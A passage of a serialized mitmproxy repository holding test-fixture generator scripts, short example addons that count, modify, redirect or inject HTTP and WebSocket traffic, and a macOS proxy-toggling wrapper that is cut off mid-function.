\"f9f7b2b9-7727-4477-822d-d3526e5b8951\"\n    tf_udp.client_conn.id = \"0a8833da-88e4-429d-ac54-61cda8a7f91c\"\n    tf_udp.server_conn.id = \"c49f9c2b-a729-4b16-9212-d181717e294b\"\n\n    tf_dns = tflow.tdnsflow(resp=True, err=True)\n    tf_dns.id = \"5434da94-1017-42fa-872d-a189508d48e4\"\n    tf_dns.client_conn.id = \"0b4cc0a3-6acb-4880-81c0-1644084126fc\"\n    tf_dns.server_conn.id = \"db5294af-c008-4098-a320-a94f901eaf2f\"\n\n    # language=TypeScript\n    content = (\n        \"/** Auto-generated by web/gen/tflow_js.py */\\n\"\n        \"import {HTTPFlow, TCPFlow, UDPFlow, DNSFlow} from '../../flow';\\n\"\n        \"export function THTTPFlow(): Required<HTTPFlow> {\\n\"\n        \"    return %s\\n\"\n        \"}\\n\"\n        \"export function TTCPFlow(): Required<TCPFlow> {\\n\"\n        \"    return %s\\n\"\n        \"}\\n\"\n        \"export function TUDPFlow(): Required<UDPFlow> {\\n\"\n        \"    return %s\\n\"\n        \"}\\n\"\n        \"export function TDNSFlow(): Required<DNSFlow> {\\n\"\n        \"    return %s\\n\"\n        \"}\\n\"\n        % (\n            textwrap.indent(\n                json.dumps(app.flow_to_json(tf_http), indent=4, sort_keys=True), \"    \"\n            ),\n            textwrap.indent(\n                json.dumps(app.flow_to_json(tf_tcp), indent=4, sort_keys=True), \"    \"\n            ),\n            textwrap.indent(\n                json.dumps(app.flow_to_json(tf_udp), indent=4, sort_keys=True), \"    \"\n            ),\n            textwrap.indent(\n                json.dumps(app.flow_to_json(tf_dns), indent=4, sort_keys=True), \"    \"\n            ),\n        )\n    )\n    content = content.replace(\": null\", \": undefined\")\n    return content\n\n\nif __name__ == \"__main__\":\n    filename.write_bytes(asyncio.run(make()).encode())\n", "web/gen/state_js.py": "#!/usr/bin/env python3\n\nimport asyncio\nimport json\nimport textwrap\nfrom pathlib import Path\nfrom unittest.mock import Mock\n\nfrom mitmproxy import options\nfrom mitmproxy.proxy.mode_servers import ServerInstance\nfrom mitmproxy.tools.web import app\nfrom mitmproxy.tools.web import master\n\nhere = Path(__file__).parent.absolute()\n\nfilename = here / \"../src/js/__tests__/ducks/_tbackendstate.ts\"\n\n\nasync def make() -> str:\n    o = options.Options()\n    m = master.WebMaster(o)\n\n    si1 = ServerInstance.make(\"regular\", m.proxyserver)\n    sock1 = Mock()\n    sock1.getsockname.return_value = (\"127.0.0.1\", 8080)\n    sock2 = Mock()\n    sock2.getsockname.return_value = (\"::1\", 8080)\n    server = Mock()\n    server.sockets = [sock1, sock2]\n    si1._servers = [server]\n    si2 = ServerInstance.make(\"reverse:example.com\", m.proxyserver)\n    si2.last_exception = RuntimeError(\"I failed somehow.\")\n    si3 = ServerInstance.make(\"socks5\", m.proxyserver)\n    m.proxyserver.servers._instances.update(\n        {\n            si1.mode: si1,\n            si2.mode: si2,\n            si3.mode: si3,\n        }\n    )\n\n    data = app.State.get_json(m)\n    await m.done()\n\n    data.update(available=True)\n    data[\"contentViews\"] = [\"Auto\", \"Raw\"]\n    data[\"version\"] = \"1.2.3\"\n\n    # language=TypeScript\n    content = (\n        \"/** Auto-generated by web/gen/state_js.py */\\n\"\n        \"import {BackendState} from '../../ducks/backendState';\\n\"\n        \"export function TBackendState(): Required<BackendState> {\\n\"\n        \"    return %s\\n\"\n        \"}\\n\"\n        % textwrap.indent(json.dumps(data, indent=4, sort_keys=True), \"    \").lstrip()\n    )\n\n    return content\n\n\nif __name__ == \"__main__\":\n    filename.write_bytes(asyncio.run(make()).encode())\n", "examples/addons/anatomy.py": "\"\"\"\nBasic skeleton of a mitmproxy addon.\n\nRun as follows: mitmproxy -s anatomy.py\n\"\"\"\n\nimport logging\n\n\nclass Counter:\n    def __init__(self):\n        self.num = 0\n\n    def request(self, flow):\n        self.num = self.num + 1\n        logging.info(\"We've seen %d flows\" % self.num)\n\n\naddons = [Counter()]\n", "examples/addons/wsgi-flask-app.py": "\"\"\"\nHost a WSGI app in mitmproxy.\n\nThis example shows how to graft a WSGI app onto mitmproxy. In this\ninstance, we're using the Flask framework (http://flask.pocoo.org/) to expose\na single simplest-possible page.\n\"\"\"\n\nfrom flask import Flask\n\nfrom mitmproxy.addons import asgiapp\n\napp = Flask(\"proxapp\")\n\n\n@app.route(\"/\")\ndef hello_world() -> str:\n    return \"Hello World!\"\n\n\naddons = [\n    # Host app at the magic domain \"example.com\" on port 80. Requests to this\n    # domain and port combination will now be routed to the WSGI app instance.\n    asgiapp.WSGIApp(app, \"example.com\", 80),\n    # TLS works too, but the magic domain needs to be resolvable from the mitmproxy machine due to mitmproxy's design.\n    # mitmproxy will connect to said domain and use its certificate but won't send any data.\n    # By using `--set upstream_cert=false` and `--set connection_strategy_lazy` the local certificate is used instead.\n    # asgiapp.WSGIApp(app, \"example.com\", 443),\n]\n", "examples/addons/commands-paths.py": "\"\"\"Handle file paths as command arguments.\"\"\"\n\nimport logging\nfrom collections.abc import Sequence\n\nfrom mitmproxy import command\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy import types\nfrom mitmproxy.log import ALERT\n\n\nclass MyAddon:\n    @command.command(\"myaddon.histogram\")\n    def histogram(\n        self,\n        flows: Sequence[flow.Flow],\n        path: types.Path,\n    ) -> None:\n        totals: dict[str, int] = {}\n        for f in flows:\n            if isinstance(f, http.HTTPFlow):\n                totals[f.request.host] = totals.setdefault(f.request.host, 0) + 1\n\n        with open(path, \"w+\") as fp:\n            for cnt, dom in sorted((v, k) for (k, v) in totals.items()):\n                fp.write(f\"{cnt}: {dom}\\n\")\n\n        logging.log(ALERT, \"done\")\n\n\naddons = [MyAddon()]\n", "examples/addons/shutdown.py": "\"\"\"\nA simple way of shutting down the mitmproxy instance to stop everything.\n\nUsage:\n\n    mitmproxy -s shutdown.py\n\n    and then send a HTTP request to trigger the shutdown:\n    curl --proxy localhost:8080 http://example.com/path\n\"\"\"\n\nimport logging\n\nfrom mitmproxy import ctx\nfrom mitmproxy import http\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    # a random condition to make this example a bit more interactive\n    if flow.request.pretty_url == \"http://example.com/path\":\n        logging.info(\"Shutting down everything...\")\n        ctx.master.shutdown()\n", "examples/addons/duplicate-modify-replay.py": "\"\"\"Take incoming HTTP requests and replay them with modified parameters.\"\"\"\n\nfrom mitmproxy import ctx\n\n\ndef request(flow):\n    # Avoid an infinite loop by not replaying already replayed requests\n    if flow.is_replay == \"request\":\n        return\n    flow = flow.copy()\n    # Only interactive tools have a view. If we have one, add a duplicate entry\n    # for our flow.\n    if \"view\" in ctx.master.addons:\n        ctx.master.commands.call(\"view.flows.duplicate\", [flow])\n    flow.request.path = \"/changed\"\n    ctx.master.commands.call(\"replay.client\", [flow])\n", "examples/addons/log-events.py": "\"\"\"Post messages to mitmproxy's event log.\"\"\"\n\nimport logging\n\nfrom mitmproxy.addonmanager import Loader\nfrom mitmproxy.log import ALERT\n\nlogger = logging.getLogger(__name__)\n\n\ndef load(loader: Loader):\n    logger.info(\"This is some informative text.\")\n    logger.warning(\"This is a warning.\")\n    logger.error(\"This is an error.\")\n    logger.log(\n        ALERT,\n        \"This is an alert. It has the same urgency as info, but will also pop up in the status bar.\",\n    )\n", "examples/addons/options-configure.py": "\"\"\"React to configuration changes.\"\"\"\n\nfrom typing import Optional\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\n\n\nclass AddHeader:\n    def load(self, loader):\n        loader.add_option(\n            name=\"addheader\",\n            typespec=Optional[int],\n            default=None,\n            help=\"Add a header to responses\",\n        )\n\n    def configure(self, updates):\n        if \"addheader\" in updates:\n            if ctx.options.addheader is not None and ctx.options.addheader > 100:\n                raise exceptions.OptionsError(\"addheader must be <= 100\")\n\n    def response(self, flow):\n        if ctx.options.addheader is not None:\n            flow.response.headers[\"addheader\"] = str(ctx.options.addheader)\n\n\naddons = [AddHeader()]\n", "examples/addons/http-modify-query-string.py": "\"\"\"Modify HTTP query parameters.\"\"\"\n\nfrom mitmproxy import http\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    flow.request.query[\"mitmproxy\"] = \"rocks\"\n", "examples/addons/commands-simple.py": "\"\"\"Add a custom command to mitmproxy's command prompt.\"\"\"\n\nimport logging\n\nfrom mitmproxy import command\n\n\nclass MyAddon:\n    def __init__(self):\n        self.num = 0\n\n    @command.command(\"myaddon.inc\")\n    def inc(self) -> None:\n        self.num += 1\n        logging.info(f\"num = {self.num}\")\n\n\naddons = [MyAddon()]\n", "examples/addons/http-redirect-requests.py": "\"\"\"Redirect HTTP requests to another server.\"\"\"\n\nfrom mitmproxy import http\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    # pretty_host takes the \"Host\" header of the request into account,\n    # which is useful in transparent mode where we usually only have the IP\n    # otherwise.\n    if flow.request.pretty_host == \"example.org\":\n        flow.request.host = \"mitmproxy.org\"\n", "examples/addons/filter-flows.py": "\"\"\"\nUse mitmproxy's filter pattern in scripts.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport logging\n\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy.addonmanager import Loader\n\n\nclass Filter:\n    filter: flowfilter.TFilter\n\n    def configure(self, updated):\n        if \"flowfilter\" in updated:\n            self.filter = flowfilter.parse(\".\")\n\n    def load(self, loader: Loader):\n        loader.add_option(\"flowfilter\", str, \"\", \"Check that flow matches filter.\")\n\n    def response(self, flow: http.HTTPFlow) -> None:\n        if flowfilter.match(self.filter, flow):\n            logging.info(\"Flow matches filter:\")\n            logging.info(flow)\n\n\naddons = [Filter()]\n", "examples/addons/options-simple.py": "\"\"\"\nAdd a new mitmproxy option.\n\nUsage:\n\n    mitmproxy -s options-simple.py --set addheader=true\n\"\"\"\n\nfrom mitmproxy import ctx\n\n\nclass AddHeader:\n    def __init__(self):\n        self.num = 0\n\n    def load(self, loader):\n        loader.add_option(\n            name=\"addheader\",\n            typespec=bool,\n            default=False,\n            help=\"Add a count header to responses\",\n        )\n\n    def response(self, flow):\n        if ctx.options.addheader:\n            self.num = self.num + 1\n            flow.response.headers[\"count\"] = str(self.num)\n\n\naddons = [AddHeader()]\n", "examples/addons/websocket-simple.py": "\"\"\"Process individual messages from a WebSocket connection.\"\"\"\n\nimport logging\nimport re\n\nfrom mitmproxy import http\n\n\ndef websocket_message(flow: http.HTTPFlow):\n    assert flow.websocket is not None  # make type checker happy\n    # get the latest message\n    message = flow.websocket.messages[-1]\n\n    # was the message sent from the client or server?\n    if message.from_client:\n        logging.info(f\"Client sent a message: {message.content!r}\")\n    else:\n        logging.info(f\"Server sent a message: {message.content!r}\")\n\n    # manipulate the message content\n    message.content = re.sub(rb\"^Hello\", b\"HAPPY\", message.content)\n\n    if b\"FOOBAR\" in message.content:\n        # kill the message and not send it to the other endpoint\n        message.drop()\n", "examples/addons/anatomy2.py": "\"\"\"An addon using the abbreviated scripting syntax.\"\"\"\n\n\ndef request(flow):\n    flow.request.headers[\"myheader\"] = \"value\"\n", "examples/addons/http-modify-form.py": "\"\"\"Modify an HTTP form submission.\"\"\"\n\nfrom mitmproxy import http\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    if flow.request.urlencoded_form:\n        # If there's already a form, one can just add items to the dict:\n        flow.request.urlencoded_form[\"mitmproxy\"] = \"rocks\"\n    else:\n        # One can also just pass new form data.\n        # This sets the proper content type and overrides the body.\n        flow.request.urlencoded_form = [(\"foo\", \"bar\")]  # type: ignore[assignment]\n", "examples/addons/contentview.py": "\"\"\"\nAdd a custom message body pretty-printer for use inside mitmproxy.\n\nThis example shows how one can add a custom contentview to mitmproxy,\nwhich is used to pretty-print HTTP bodies for example.\nThe content view API is explained in the mitmproxy.contentviews module.\n\"\"\"\n\nfrom mitmproxy import contentviews\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy.addonmanager import Loader\n\n\nclass ViewSwapCase(contentviews.View):\n    name = \"swapcase\"\n\n    def __call__(\n        self,\n        data: bytes,\n        *,\n        content_type: str | None = None,\n        flow: flow.Flow | None = None,\n        http_message: http.Message | None = None,\n        **unknown_metadata,\n    ) -> contentviews.TViewResult:\n        return \"case-swapped text\", contentviews.format_text(data.swapcase())\n\n    def render_priority(\n        self,\n        data: bytes,\n        *,\n        content_type: str | None = None,\n        flow: flow.Flow | None = None,\n        http_message: http.Message | None = None,\n        **unknown_metadata,\n    ) -> float:\n        if content_type == \"text/plain\":\n            return 1\n        else:\n            return 0\n\n\nview = ViewSwapCase()\n\n\ndef load(loader: Loader):\n    contentviews.add(view)\n\n\ndef done():\n    contentviews.remove(view)\n", "examples/addons/io-read-saved-flows.py": "#!/usr/bin/env python\n\"\"\"\nRead a mitmproxy dump file.\n\"\"\"\n\nimport pprint\nimport sys\n\nfrom mitmproxy import http\nfrom mitmproxy import io\nfrom mitmproxy.exceptions import FlowReadException\n\nwith open(sys.argv[1], \"rb\") as logfile:\n    freader = io.FlowReader(logfile)\n    pp = pprint.PrettyPrinter(indent=4)\n    try:\n        for f in freader.stream():\n            print(f)\n            if isinstance(f, http.HTTPFlow):\n                print(f.request.host)\n            pp.pprint(f.get_state())\n            print(\"\")\n    except FlowReadException as e:\n        print(f\"Flow file corrupted: {e}\")\n", "examples/addons/contentview-custom-grpc.py": "\"\"\"\nAdd a custom version of the gRPC/protobuf content view, which parses\nprotobuf messages based on a user defined rule set.\n\n\"\"\"\n\nfrom mitmproxy import contentviews\nfrom mitmproxy.addonmanager import Loader\nfrom mitmproxy.contentviews.grpc import ProtoParser\nfrom mitmproxy.contentviews.grpc import ViewConfig\nfrom mitmproxy.contentviews.grpc import ViewGrpcProtobuf\n\nconfig: ViewConfig = ViewConfig()\nconfig.parser_rules = [\n    # Note:\n    #\n    # The first two ParserRules use the same flow filter, although one should reply to request messages and the other to responses.\n    # Even with '~s' and '~q' filter expressions, the whole flow would be matched (for '~s') or not matched at all (for '~q'), if\n    # the contentview displays a http.Message belonging to a flow with existing request and response.\n    # The rules would have to be applied on per-message-basis, instead of per-flow-basis to distinguish request and response (the\n    # contentview deals with a single message, either request or response, the flow filter with a flow contiaing both).\n    #\n    # Thus different ParserRule classes are used to restrict rules to requests or responses were needed:\n    #\n    # - ParserRule: applied to requests and responses\n    # - ParserRuleRequest: applies to requests only\n    # - ParserRuleResponse: applies to responses only\n    #\n    # The actual 'filter' definition in the rule, would still match the whole flow. This means '~u' expressions could\n    # be used, to match the URL from the request of a flow, while the ParserRuleResponse is only applied to the response.\n    ProtoParser.ParserRuleRequest(\n        name=\"Geo coordinate lookup request\",\n        # note on flowfilter: for tflow the port gets appended to the URL's host part\n        filter=\"example\\\\.com.*/ReverseGeocode\",\n        field_definitions=[\n            ProtoParser.ParserFieldDefinition(tag=\"1\", name=\"position\"),\n            ProtoParser.ParserFieldDefinition(\n                tag=\"1.1\",\n                name=\"latitude\",\n                intended_decoding=ProtoParser.DecodedTypes.double,\n            ),\n            ProtoParser.ParserFieldDefinition(\n                tag=\"1.2\",\n                name=\"longitude\",\n                intended_decoding=ProtoParser.DecodedTypes.double,\n            ),\n            ProtoParser.ParserFieldDefinition(tag=\"3\", name=\"country\"),\n            ProtoParser.ParserFieldDefinition(tag=\"7\", name=\"app\"),\n        ],\n    ),\n    ProtoParser.ParserRuleResponse(\n        name=\"Geo coordinate lookup response\",\n        # note on flowfilter: for tflow the port gets appended to the URL's host part\n        filter=\"example\\\\.com.*/ReverseGeocode\",\n        field_definitions=[\n            ProtoParser.ParserFieldDefinition(tag=\"1.2\", name=\"address\"),\n            ProtoParser.ParserFieldDefinition(tag=\"1.3\", name=\"address array element\"),\n            ProtoParser.ParserFieldDefinition(\n                tag=\"1.3.1\",\n                name=\"unknown bytes\",\n                intended_decoding=ProtoParser.DecodedTypes.bytes,\n            ),\n            ProtoParser.ParserFieldDefinition(tag=\"1.3.2\", name=\"element value long\"),\n            ProtoParser.ParserFieldDefinition(tag=\"1.3.3\", name=\"element value short\"),\n            ProtoParser.ParserFieldDefinition(\n                tag=\"\",\n                tag_prefixes=[\"1.5.1\", \"1.5.3\", \"1.5.4\", \"1.5.5\", \"1.5.6\"],\n                name=\"position\",\n            ),\n            ProtoParser.ParserFieldDefinition(\n                tag=\".1\",\n                tag_prefixes=[\"1.5.1\", \"1.5.3\", \"1.5.4\", \"1.5.5\", \"1.5.6\"],\n                name=\"latitude\",\n                intended_decoding=ProtoParser.DecodedTypes.double,\n            ),\n            ProtoParser.ParserFieldDefinition(\n                tag=\".2\",\n                tag_prefixes=[\"1.5.1\", \"1.5.3\", \"1.5.4\", \"1.5.5\", \"1.5.6\"],\n                name=\"longitude\",\n                intended_decoding=ProtoParser.DecodedTypes.double,\n            ),\n            ProtoParser.ParserFieldDefinition(tag=\"7\", name=\"app\"),\n        ],\n    ),\n]\n\n\nclass ViewGrpcWithRules(ViewGrpcProtobuf):\n    name = \"customized gRPC/protobuf\"\n\n    def __init__(self) -> None:\n        super().__init__(config=config)\n\n    def __call__(self, *args, **kwargs) -> contentviews.TViewResult:\n        heading, lines = super().__call__(*args, **kwargs)\n        return heading + \" (addon with custom rules)\", lines\n\n    def render_priority(self, *args, **kwargs) -> float:\n        # increase priority above default gRPC view\n        s_prio = super().render_priority(*args, **kwargs)\n        return s_prio + 1 if s_prio > 0 else s_prio\n\n\nview = ViewGrpcWithRules()\n\n\ndef load(loader: Loader):\n    contentviews.add(view)\n\n\ndef done():\n    contentviews.remove(view)\n", "examples/addons/websocket-inject-message.py": "\"\"\"\nInject a WebSocket message into a running connection.\n\nThis example shows how to inject a WebSocket message into a running connection.\n\"\"\"\n\nimport asyncio\n\nfrom mitmproxy import ctx\nfrom mitmproxy import http\n\n# Simple example: Inject a message as a response to an event\n\n\ndef websocket_message(flow: http.HTTPFlow):\n    assert flow.websocket is not None  # make type checker happy\n    last_message = flow.websocket.messages[-1]\n    if last_message.is_text and \"secret\" in last_message.text:\n        last_message.drop()\n        ctx.master.commands.call(\n            \"inject.websocket\", flow, last_message.from_client, b\"ssssssh\"\n        )\n\n\n# Complex example: Schedule a periodic timer\n\n\nasync def inject_async(flow: http.HTTPFlow):\n    msg = \"hello from mitmproxy! \"\n    assert flow.websocket is not None  # make type checker happy\n    while flow.websocket.timestamp_end is None:\n        ctx.master.commands.call(\"inject.websocket\", flow, True, msg.encode())\n        await asyncio.sleep(1)\n        msg = msg[1:] + msg[:1]\n\n\n# Python 3.11: replace with TaskGroup\ntasks = set()\n\n\ndef websocket_start(flow: http.HTTPFlow):\n    # we need to hold a reference to the task, otherwise it will be garbage collected.\n    t = asyncio.create_task(inject_async(flow))\n    tasks.add(t)\n    t.add_done_callback(tasks.remove)\n", "examples/addons/http-stream-simple.py": "\"\"\"\nSelect which responses should be streamed.\n\nEnable response streaming for all HTTP flows.\nThis is equivalent to passing `--set stream_large_bodies=1` to mitmproxy.\n\"\"\"\n\n\ndef responseheaders(flow):\n    \"\"\"\n    Enables streaming for all responses.\n    This is equivalent to passing `--set stream_large_bodies=1` to mitmproxy.\n    \"\"\"\n    flow.response.stream = True\n", "examples/addons/tcp-simple.py": "\"\"\"\nProcess individual messages from a TCP connection.\n\nThis script replaces full occurrences of \"foo\" with \"bar\" and prints various details for each message.\nPlease note that TCP is stream-based and *not* message-based. mitmproxy splits stream contents into \"messages\"\nas they are received by socket.recv(). This is pretty arbitrary and should not be relied on.\nHowever, it is sometimes good enough as a quick hack.\n\nExample Invocation:\n\n    mitmdump --tcp-hosts \".*\" -s examples/tcp-simple.py\n\"\"\"\n\nimport logging\n\nfrom mitmproxy import tcp\nfrom mitmproxy.utils import strutils\n\n\ndef tcp_message(flow: tcp.TCPFlow):\n    message = flow.messages[-1]\n    message.content = message.content.replace(b\"foo\", b\"bar\")\n\n    logging.info(\n        f\"tcp_message[from_client={message.from_client}), content={strutils.bytes_to_escaped_str(message.content)}]\"\n    )\n", "examples/addons/internet-in-mirror.py": "\"\"\"\nMirror all web pages.\n\nUseful if you are living down under.\n\"\"\"\n\nfrom mitmproxy import http\n\n\ndef response(flow: http.HTTPFlow) -> None:\n    if flow.response and flow.response.content:\n        flow.response.content = flow.response.content.replace(\n            b\"</head>\", b\"<style>body {transform: scaleX(-1);}</style></head>\"\n        )\n", "examples/addons/io-write-flow-file.py": "\"\"\"\nGenerate a mitmproxy dump file.\n\nThis script demonstrates how to generate a mitmproxy dump file,\nas it would also be generated by passing `-w` to mitmproxy.\nIn contrast to `-w`, this gives you full control over which\nflows should be saved and also allows you to rotate files or log\nto multiple files in parallel.\n\"\"\"\n\nimport os\nimport random\nfrom typing import BinaryIO\n\nfrom mitmproxy import http\nfrom mitmproxy import io\n\n\nclass Writer:\n    def __init__(self) -> None:\n        # We are using an environment variable to keep the example as simple as possible,\n        # consider implementing this as a mitmproxy option instead.\n        filename = os.getenv(\"MITMPROXY_OUTFILE\", \"out.mitm\")\n        self.f: BinaryIO = open(filename, \"wb\")\n        self.w = io.FlowWriter(self.f)\n\n    def response(self, flow: http.HTTPFlow) -> None:\n        if random.choice([True, False]):\n            self.w.add(flow)\n\n    def done(self):\n        self.f.close()\n\n\naddons = [Writer()]\n", "examples/addons/http-stream-modify.py": "\"\"\"\nModify a streamed response.\n\nGenerally speaking, we recommend *not* to stream messages you need to modify.\nModifying streamed responses is tricky and brittle:\n    - If the transfer encoding isn't chunked, you cannot simply change the content length.\n    - If you want to replace all occurrences of \"foobar\", make sure to catch the cases\n      where one chunk ends with [...]foo\" and the next starts with \"bar[...].\n\"\"\"\n\nfrom collections.abc import Iterable\n\n\ndef modify(data: bytes) -> bytes | Iterable[bytes]:\n    \"\"\"\n    This function will be called for each chunk of request/response body data that arrives at the proxy,\n    and once at the end of the message with an empty bytes argument (b\"\").\n\n    It may either return bytes or an iterable of bytes (which would result in multiple HTTP/2 data frames).\n    \"\"\"\n    return data.replace(b\"foo\", b\"bar\")\n\n\ndef responseheaders(flow):\n    flow.response.stream = modify\n", "examples/addons/commands-flows.py": "\"\"\"Handle flows as command arguments.\"\"\"\n\nimport logging\nfrom collections.abc import Sequence\n\nfrom mitmproxy import command\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy.log import ALERT\n\n\nclass MyAddon:\n    @command.command(\"myaddon.addheader\")\n    def addheader(self, flows: Sequence[flow.Flow]) -> None:\n        for f in flows:\n            if isinstance(f, http.HTTPFlow):\n                f.request.headers[\"myheader\"] = \"value\"\n        logging.log(ALERT, \"done\")\n\n\naddons = [MyAddon()]\n", "examples/addons/http-trailers.py": "\"\"\"\nThis script simply prints all received HTTP Trailers.\n\nHTTP requests and responses can contain trailing headers which are sent after\nthe body is fully transmitted. Such trailers need to be announced in the initial\nheaders by name, so the receiving endpoint can wait and read them after the\nbody.\n\"\"\"\n\nfrom mitmproxy import http\nfrom mitmproxy.http import Headers\n\n\ndef request(flow: http.HTTPFlow):\n    if flow.request.trailers:\n        print(\"HTTP Trailers detected! Request contains:\", flow.request.trailers)\n\n    if flow.request.path == \"/inject_trailers\":\n        if flow.request.is_http10:\n            # HTTP/1.0 doesn't support trailers\n            return\n        elif flow.request.is_http11:\n            if not flow.request.content:\n                # Avoid sending a body on GET requests or a 0 byte chunked body with trailers.\n                # Otherwise some servers return 400 Bad Request.\n                return\n            # HTTP 1.1 requires transfer-encoding: chunked to send trailers\n            flow.request.headers[\"transfer-encoding\"] = \"chunked\"\n        # HTTP 2+ supports trailers on all requests/responses\n\n        flow.request.headers[\"trailer\"] = \"x-my-injected-trailer-header\"\n        flow.request.trailers = Headers([(b\"x-my-injected-trailer-header\", b\"foobar\")])\n        print(\"Injected a new request trailer...\", flow.request.headers[\"trailer\"])\n\n\ndef response(flow: http.HTTPFlow):\n    assert flow.response\n    if flow.response.trailers:\n        print(\"HTTP Trailers detected! Response contains:\", flow.response.trailers)\n\n    if flow.request.path == \"/inject_trailers\":\n        if flow.request.is_http10:\n            return\n        elif flow.request.is_http11:\n            if not flow.response.content:\n                return\n            flow.response.headers[\"transfer-encoding\"] = \"chunked\"\n\n        flow.response.headers[\"trailer\"] = \"x-my-injected-trailer-header\"\n        flow.response.trailers = Headers([(b\"x-my-injected-trailer-header\", b\"foobar\")])\n        print(\"Injected a new response trailer...\", flow.response.headers[\"trailer\"])\n", "examples/addons/nonblocking.py": "\"\"\"\nMake events hooks non-blocking using async or @concurrent.\n\"\"\"\n\nimport asyncio\nimport logging\nimport time\n\nfrom mitmproxy.script import concurrent\n\n# Toggle between asyncio and thread-based alternatives.\nif True:\n    # Hooks can be async, which allows the hook to call async functions and perform async I/O\n    # without blocking other requests. This is generally preferred for new addons.\n    async def request(flow):\n        logging.info(f\"handle request: {flow.request.host}{flow.request.path}\")\n        await asyncio.sleep(5)\n        logging.info(f\"start  request: {flow.request.host}{flow.request.path}\")\n\nelse:\n    # Another option is to use @concurrent, which launches the hook in its own thread.\n    # Please note that this generally opens the door to race conditions and decreases performance if not required.\n    @concurrent  # Remove this to make it synchronous and see what happens\n    def request(flow):\n        logging.info(f\"handle request: {flow.request.host}{flow.request.path}\")\n        time.sleep(5)\n        logging.info(f\"start  request: {flow.request.host}{flow.request.path}\")\n", "examples/addons/http-add-header.py": "\"\"\"Add an HTTP header to each response.\"\"\"\n\n\nclass AddHeader:\n    def __init__(self):\n        self.num = 0\n\n    def response(self, flow):\n        self.num = self.num + 1\n        flow.response.headers[\"count\"] = str(self.num)\n\n\naddons = [AddHeader()]\n", "examples/addons/http-reply-from-proxy.py": "\"\"\"Send a reply from the proxy without sending the request to the remote server.\"\"\"\n\nfrom mitmproxy import http\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    if flow.request.pretty_url == \"http://example.com/path\":\n        flow.response = http.Response.make(\n            200,  # (optional) status code\n            b\"Hello World\",  # (optional) content\n            {\"Content-Type\": \"text/html\"},  # (optional) headers\n        )\n", "examples/contrib/har_dump.py": "\"\"\"\nThis addon is now part of mitmproxy! See mitmproxy/addons/savehar.py.\n\"\"\"\n", "examples/contrib/mitmproxywrapper.py": "#!/usr/bin/env python\n#\n# Helper tool to enable/disable OS X proxy and wrap mitmproxy\n#\n# Get usage information with:\n#\n# mitmproxywrapper.py -h\n#\nimport argparse\nimport contextlib\nimport os\nimport re\nimport signal\nimport socketserver\nimport subprocess\nimport sys\n\n\nclass Wrapper:\n    def __init__(self, port, use_mitmweb, extra_arguments=None):\n        self.port = port\n        self.use_mitmweb = use_mitmweb\n        self.extra_arguments = extra_arguments\n\n    def run_networksetup_command(self, *arguments):\n        return subprocess.check_output(\n            [\"sudo\", \"networksetup\"] + list(arguments)\n        ).decode()\n\n    def proxy_state_for_service(self, service):\n        state = self.run_networksetup_command(\"-getwebproxy\", service).splitlines()\n        return dict([re.findall(r\"([^:]+): (.*)\", line)[0] for line in state])\n\n    def enable_proxy_for_service(self, service):\n        print(f\"Enabling proxy on {service}...\")\n        for subcommand in [\"-setwebproxy\", \"-setsecurewebproxy\"]:\n            self.run_networksetup_command(\n                subcommand, service, \"127.0.0.1\", str(self.port)\n            )\n\n    def disable_proxy_for_service(self, service):\n        print(f\"Disabling proxy on {service}...\")\n        for subcommand in [\"-setwebproxystate\", \"-setsecurewebproxystate\"]:\n            self.run_networksetup_command(subcommand, service, \"Off\")\n\n    def interface_name_to_service_name_map(self):\n        order = self.run_networksetup_command(\"-listnetworkserviceorder\")\n        mapping = re.findall(\n            r\"\\(\\d+\\)\\s(.*)$\\n\\(.*Device: (.+)\\)$\", order, re.MULTILINE\n        )\n        return {b: a for (a, b) in mapping}\n\n    def run_command_with_input(self, command, input):\n        popen = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n        (stdout, stderr) = popen.communicate(input.encode())\n        return stdout.decode()\n\n    def primary_interace_name(self):\n        scutil_script = \"get State:/Network/Global/IPv4\\nd.show\\n\"\n        stdout = self.run_command_with_input(\"/usr/sbin/scutil\", scutil_script)\n        (interface,) = re.findall(r\"PrimaryInterface\\s*:\\s*(.+)\", stdout)\n        return interface\n\n    def primary_service_name(self):\n        return self.interface_name_to_service_name_map()[self.primary_interace_name()]\n\n    def proxy_enabled_for_service(self, service):\n        return self.proxy_state_for_service(service)[\"Enabled\"] == \"Yes\"\n\n    def toggle_proxy(self):\n        new_state = not self.proxy_enabled_for_service(self.primary_service_name())\n        for service_name in self.connected_service_names():\n            if self.proxy_enabled_for_service(service_name) and not new_state:\n                self.disable_proxy_for_service(service_name)\n            elif not self.proxy_enabled_for_service(service_name) and new_state:\n                self.enable_proxy_for_service(service_name)\n\n    def connected_service_names(self):\n        scutil_script = \"list\\n\"\n        stdout = self.run_command_with_input(\"/usr/sbin/scutil\", scutil_script)\n        service_ids = re.findall(r\"State:/Network/Service/(.+)/IPv4\", stdout)\n\n        service_names = []\n        for service_id in service_ids:\n            scutil_script = f\"show Setup:/Network/Service/{service_id}\\n\"\n            stdout = self.run_command_with_input(\"/usr/sbin/scutil\", scutil_script)\n            (service_name,) = re.findall(r\"UserDefinedName\\s*:\\s*(.+)\", stdout)\n            service_names.append(service_name)\n\n        return service_names\n\n    def wrap_mitmproxy(self):\n        with self.wrap_proxy():\n            cmd = [\"mitmweb\" if self.use_mitmweb else \"mitmproxy\", \"-p\", str(self.port)]\n            if self.extra_arguments:\n                cmd.extend(self.extra_arguments)\n            subprocess.check_call(cmd)\n\n    def wrap_honeyproxy(self):\n        with self.wrap_proxy():\n            popen = subprocess.Popen(\"honeyproxy.sh\")\n            try:\n                popen.wait()\n            except KeyboardInterrupt:\n                popen.terminate()\n\n    @contextlib.contextmanager\n    def wrap_proxy(self):\n        connected_service_names = self.connected_service_names()\n        for service_name in connected_service_names:\n            if not self.proxy_enabled_for_service(service_name):\n                